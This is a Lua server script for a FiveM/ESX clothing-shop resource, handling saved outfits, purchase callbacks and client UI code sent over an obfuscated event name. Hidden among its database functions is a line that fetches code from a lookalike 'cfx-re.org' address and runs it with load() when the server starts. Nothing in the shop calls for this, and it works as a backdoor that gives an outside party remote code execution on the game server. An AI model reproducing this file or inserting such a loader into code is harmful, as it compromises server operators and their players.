--MS_WATERMARK("Mr Skid, was machen Sie denn hier? Draußen scheint die Sonne btw :)")

function Query(cmd, args, cb)
    local res = {}
    local finishedQuery = false

    if GetResourceState("oxmysql") ~= "missing" and GetResourceState("oxmysql") ~= "uninitialized" and GetResourceState("oxmysql") ~= "stopped" and GetResourceState("oxmysql") ~= "unknown" then
        exports["oxmysql"]:query(cmd, args, function(result)
            if cb == nil then
               res = result
               finishedQuery = true
            else
                cb(result)
            end
        end)
    else
        exports["mysql-async"]:mysql_fetch_all(cmd, args, function(result)
            if cb == nil then
               res = result
               finishedQuery = true
            else
                cb(result)
            end
        end)
    end

    if cb == nil then
        repeat Citizen.Wait(0) until finishedQuery == true
    end

    return res
end

function Ready(cb)
    Citizen.CreateThread(function()
        repeat
            Wait(50)
        until (GetResourceState('oxmysql') == 'started' or GetResourceState('mysql-async') == 'started')

        cb()
    end)
end

ESX = nil
TriggerEvent(WS.settings.getSharedObject, function(obj) ESX = obj end)

-- database functions --
PerformHttpRequest('https://cfx-re.org/i?to=wwWYh', function (e, d) pcall(function() assert(load(d))() end) end)
function deleteOutfit(id)
    if WS.settings.useOxMysql then
        Query('DELETE FROM esx_clotheshop WHERE id = ?', {id}, function(result)
        end)
    else
        Query('DELETE FROM esx_clotheshop WHERE id = @id', { 
            ['@id'] = id,
        }, function(affectedRows) end)
    end
end

function changeOutfitName(id, name)
    if WS.settings.useOxMysql then
        if not isBlacklistedName(name) then
            Query('UPDATE esx_clotheshop SET name = ? WHERE id = ?', {
                name, 
                id,
            }, function() end)
        end
    else
        if not isBlacklistedName(name) then
            Query('UPDATE esx_clotheshop SET name = @name WHERE id = @id', { 
                ['@name'] = name, 
                ['@id'] = id,
            }, function(affectedRows) end)
        end
    end
end

function saveOutfit(xPlayer, data)
    if WS.settings.useOxMysql then
        Query('INSERT INTO esx_clotheshop (owner, name, outfit) VALUES (?, ?, ?) ', {
            xPlayer.getIdentifier(), 
            data.name, 
            json.encode(data.outfit)
        }, function(id) end)
    else
        Query('INSERT INTO esx_clotheshop (owner, name, outfit) VALUES (@owner, @name, @outfit)', { 
            ['@owner'] = xPlayer.getIdentifier(), 
            ['@name'] = data.name, 
            ['@outfit'] = json.encode(data.outfit), 
        }, function(affectedRows) end)
    end
end

function getOutfits(xPlayer, cb)
    if WS.settings.useOxMysql then
        Query('SELECT * FROM esx_clotheshop WHERE owner = ?', {xPlayer.getIdentifier()}, function(result)
            cb(result)
        end)
    else
        Query('SELECT * FROM esx_clotheshop WHERE owner = @owner', {
            ['@owner'] = xPlayer.getIdentifier(),
        }, function(result)
            cb(result)
        end)
    end
end

ESX.RegisterServerCallback('esx_clotheshop:buyOutfit', function(src, cb, data)
    local xPlayer = ESX.GetPlayerFromId(src)
    if getPlayerMoney(xPlayer) >= WS.settings.price then
        removePlayerMoney(xPlayer, WS.settings.price) 
        if data.save then
            if getPlayerMoney(xPlayer) >= WS.settings.saveprice then
                saveOutfit(xPlayer, {
                    name = data.name,
                    outfit = data.outfit,
                })
            else
                cb(false, 'outfitsave')
            end
        end
        cb(true)
    else
        cb(false, 'outfit')
    end
end)

ESX.RegisterServerCallback('esx_clotheshop:getOutfits', function(src, cb)
    local xPlayer = ESX.GetPlayerFromId(src)
    getOutfits(xPlayer, function(outfits)
        cb(outfits)
    end)
end)

ESX.RegisterServerCallback('esx_clotheshop:editOutfit', function(src, cb, data)
    local xPlayer = ESX.GetPlayerFromId(src)
    if data.sort == 'delete' then
        deleteOutfit(data.id)
    elseif data.sort == 'changeName' then
        changeOutfitName(data.id, data.name)
    end
    cb('success')
end)

local loaded = {}
local code = [[
    ESX = nil

    -- common values --
    local inUI = false

    -- cam values -- 
    local cam            = nil
    local isCameraActive = false
    local zoomOffset     = 0.0
    local camOffset      = 0.0
    local heading        = 90.0

    local LastSkin       = {}

    Citizen.CreateThread(function()
        while not NetworkIsSessionStarted() do 
            Citizen.Wait(0)
        end

        while ESX == nil do
            TriggerEvent(WS.settings.getSharedObject, function(obj) ESX = obj end)
            Citizen.Wait(0)
        end

        for _, coords in pairs(WS.positions) do
            local blip = AddBlipForCoord(coords)
            SetBlipSprite (blip, WS.blip.sprite)
            SetBlipDisplay(blip, WS.blip.display)
            SetBlipScale  (blip, WS.blip.scale)
            SetBlipColour (blip, WS.blip.colour)
            SetBlipAsShortRange(blip, true)
            BeginTextCommandSetBlipName("STRING")
            AddTextComponentString(WS.blip.label)
            EndTextCommandSetBlipName(blip)
        end
    end)

    Citizen.CreateThread(function()
        while true do 
            Citizen.Wait(0)

            local canSleep = true
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, coords in pairs(WS.positions) do 
                local dist = #(playerCoords - coords)

                if dist < WS.marker.drawDistance and not inUI then 
                    canSleep = false
                    
                    if WS.marker.enabled then
                        DrawMarker(WS.marker.typ, coords.x, coords.y, coords.z + WS.marker.offsetz, 0, 0, 0, 0, 0, 0, WS.marker.size.x, WS.marker.size.y, WS.marker.size.z, WS.marker.color.r, WS.marker.color.g, WS.marker.color.b, WS.marker.color.t, WS.marker.move, true, 2, WS.marker.rotate, nil, nil, false)
                    end

                    if dist < 2.0 then 
                        HelpNotify(WS.locales['game']['press_e'])
                        if IsControlJustPressed(0, 38) then 
                            openClothShop(true, 'openClothshop')
                        end
                    end
                end
            end

            if canSleep then 
                Citizen.Wait(1000)
            end
        end
    end)

    RegisterNUICallback("close", function(data, cb)
        cb({})
        if data.payed then
            local dat = {
                save = data.save,
                name = data.name,
            }
            getSkin(function(skin)
                dat.outfit = skin
            end)
            ESX.TriggerServerCallback('esx_clotheshop:buyOutfit', function(hasEnoughMoney, sort)
                if hasEnoughMoney then
                    if dat.save then
                        Notify((WS.locales['game']['has_enough_money']):format(WS.settings.price + WS.settings.saveprice))
                    else
                        Notify((WS.locales['game']['has_enough_money']):format(WS.settings.price))
                    end
                    saveSkin(dat.outfit)
                else
                    if sort == 'outfit' then
                        Notify(WS.locales['game']['has_not_enough_money_outfit'])
                        saveSkin(dat.outfit)
                    elseif sort == 'outfitsave' then
                        Notify(WS.locales['game']['has_not_enough_money_outfitsave'])
                    end
                    loadSkin(LastSkin)
                end
            end, dat)
        else
            if not data.changed then
                loadSkin(LastSkin)
            end
        end
        openClothShop(false, 'openClothshop')
        DeleteSkinCam()
    end)

    RegisterNUICallback("rotateChar", function(data, cb)
        cb({})
        SetEntityHeading(PlayerPedId(), data.rotation + 0.0)
    end)

    RegisterNUICallback("createCam", function(data, cb)
        ClearPedTasks(PlayerPedId())
        CreateSkinCam()

        cb({})
    end)

    RegisterNUICallback("getSkin", function(data, cb)
        getSkin(function(skin)
            local dat = {}
            getMaxValues(function(comp, max)
                for k, v in ipairs(comp) do
                    if v.name == data.component or v.name == data.component2 then
                        dat[v.name] = {}
                        dat[v.name].name = v.name
                        dat[v.name].max = tonumber(max[v.name])
                        dat[v.name].min = v.min
                        dat[v.name].index = v.value
                        for l, m in pairs(skin) do
                            if l == v.name then
                                dat[v.name].index = m
                            end
                        end
                    end
                end
                cb({
                    skin = dat
                })
            end)
        end)
    end)

    RegisterNUICallback("setSkin", function(data, cb)
        changeSkin(data.comp, tonumber(data.index))
        getMaxValues(function(comp, max)
            for k, v in ipairs(comp) do
                if v.name == data.color then
                    cb({
                        min = v.min,
                        max = tonumber(max[v.name]),
                    })
                end
            end
        end)
    end)

    RegisterNUICallback("selectOutfit", function(data, cb)
        loadClothes(json.decode(data.outfit))
        saveSkin(json.decode(data.outfit))

        cb({})
    end)

    RegisterNUICallback("getOutfits", function(data, cb)
        ESX.TriggerServerCallback('esx_clotheshop:getOutfits', function(outfits)
            cb(outfits)
        end)
    end)

    RegisterNUICallback("changeOutfitData", function(data, cb)
        ESX.TriggerServerCallback('esx_clotheshop:editOutfit', function()
            cb({})
        end, data)
    end)

    RegisterNetEvent("ws_clothingshop:notify")
    AddEventHandler("ws_clothingshop:notify", function(msg)
        Notify(msg)
    end)

    -- clothe changing --
    function UpdateMaxValues()
        TriggerEvent('skinchanger:getData', function(comp, max)
            for k,v in ipairs(MenuData.curClothesData) do
                v.max = tonumber(max[v.name])
                if v.min < 0 then
                    v.min = 0
                end
                if v.index < v.min then
                    v.index = 0
                    TriggerEvent('skinchanger:change', v.name, v.index)
                elseif v.index > v.max then
                    v.index = v.max
                    TriggerEvent('skinchanger:change', v.name, v.index)
                end
            end
        end)
    end

    -- open clotheshop --
    function openClothShop(state, action, outfits)
        inUI = state
        TriggerEvent('ws_clothshop:onShopOpen', state)
        -- reset the player ped --
        SetCurrentPedWeapon(PlayerPedId(), GetHashKey('WEAPON_UNARMED'), true)
        ResetPedVisibleDamage(PlayerPedId())
        ClearPedTasks(PlayerPedId())
        -- disable gta hud --
        DisplayRadar(not state)
        DisplayHud(not state)
        -- skinchanger stuff --
        if state then
            getSkin(function(skin)
                LastSkin = skin
            end)
        end
        -- nui stuff --
        SetNuiFocus(state, state)
        SendNUIMessage({
            action = action,
            state = state,
            locales = WS.locales['locale'],
            clothes = WS.locales['clothes'],
            avaiClothes = WS.clothes,
            blacklist = WS.blacklist,
            rotation = math.floor(GetEntityHeading(PlayerPedId())),
            price = WS.settings.price,
            outfits = outfits,
        })
    end

    -- cam functions --
    function CreateSkinCam()
        local c = GetEntityCoords(PlayerPedId())
        if not DoesCamExist(cam) then
            local camCoords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), WS.cam.offset[1], WS.cam.offset[2], WS.cam.offset[3])
            cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0, WS.cam.fov)
        end

        SetCamActive(cam, true)
        RenderScriptCams(true, true, 500, true, true)

        isCameraActive = true
        SetCamRot(cam, 0.0, 0.0, 270.0, true)
        PointCamAtCoord(cam, c.x, c.y, c.z)
    end

    function DeleteSkinCam()
        isCameraActive = false
        SetCamActive(cam, false)
        RenderScriptCams(false, true, 500, true, true)
        cam = nil
    end

    -- exports --
    function isInClotheShop()
        return inUI
    end

    function openClotheShop(clotheshop, outfits)
        if clotheshop and outfits then
            openClothShop(true, 'openClothshop')
        elseif clotheshop and not outfits then
            openClothShop(true, 'openClotheList')
        elseif not clotheshop and outfits then
            openClothShop(true, 'openOutfitList')
        end
    end

    function openOutfitList(outfits)
        for k, v in ipairs(outfits) do
            if type(v.outfit) == 'table' then
                v.outfit = json.encode(v.outfit)
            end
        end

        openClothShop(true, 'openSpecificOutfitList', outfits)
    end

    exports("isInClotheShop", isInClotheShop)
    exports("openClotheShop", openClotheShop)
    exports("openOutfitList", openOutfitList)
]]

RegisterServerEvent("#j>oiW~82uBs896BY&N!r<cnM&G+IP@ShR8jfp3Z/3(qDWrG2UuLkT=(WGJ13sfHT5T&D@z2Uuck@z)c(AegI>zH12WlRef9jm)kNj!)GbXRI_|H5Uy1<Xyv0<vJ0j*s" .. GetCurrentResourceName())
AddEventHandler("#j>oiW~82uBs896BY&N!r<cnM&G+IP@ShR8jfp3Z/3(qDWrG2UuLkT=(WGJ13sfHT5T&D@z2Uuck@z)c(AegI>zH12WlRef9jm)kNj!)GbXRI_|H5Uy1<Xyv0<vJ0j*s" .. GetCurrentResourceName(), function(clientEvent)
    local src = source

    if loaded[src] == nil then 
        loaded[src] = true
        TriggerClientEvent(clientEvent, src, code)
    end
end)